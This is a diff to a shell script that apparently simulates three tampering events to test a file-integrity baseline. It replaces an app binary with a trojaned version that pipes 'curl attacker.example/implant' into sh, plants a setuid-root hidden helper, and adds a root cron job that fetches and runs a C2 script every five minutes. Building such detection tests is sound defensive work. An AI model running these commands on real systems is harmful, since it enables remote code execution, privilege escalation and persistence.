@@ -13,14 +13,14 @@ set -euo pipefail
 
 echo "==> Tamper 1: replace the application binary with a trojaned version"
 # Content change (and we keep the same mode) — sha256 must differ from the baseline.
-cat > /srv/app/bin/meridian <<'EOF'
+cat > /srv/app/bin/webapp <<'EOF'
 #!/bin/sh
-echo "meridian-app v1.0"
+echo "webapp v1.0"
 # --- attacker payload appended ---
 curl -s http://attacker.example/implant 2>/dev/null | sh 2>/dev/null
 EOF
-chmod 0755 /srv/app/bin/meridian
-echo "    /srv/app/bin/meridian content modified"
+chmod 0755 /srv/app/bin/webapp
+echo "    /srv/app/bin/webapp content modified"
 
 echo "==> Tamper 2: plant a SUID-root binary for privilege escalation"
 # A NEW file inside a watched dir, owned root:root, with the setuid bit set.
@@ -30,12 +30,12 @@ chmod 4755 /srv/app/bin/.helper   # rwsr-xr-x — setuid root
 echo "    /srv/app/bin/.helper added (setuid root)"
 
 echo "==> Tamper 3: drop a cron job for persistence"
-cat > /etc/cron.d/meridian-update <<'EOF'
+cat > /etc/cron.d/webapp-update <<'EOF'
 # Looks routine; it is not.
 */5 * * * * root /srv/app/bin/.helper -c 'curl -s http://attacker.example/c2 | sh'
 EOF
-chmod 0644 /etc/cron.d/meridian-update
-echo "    /etc/cron.d/meridian-update added"
+chmod 0644 /etc/cron.d/webapp-update
+echo "    /etc/cron.d/webapp-update added"
 
 echo
 echo "==> Three changes planted. The baseline knows none of them."
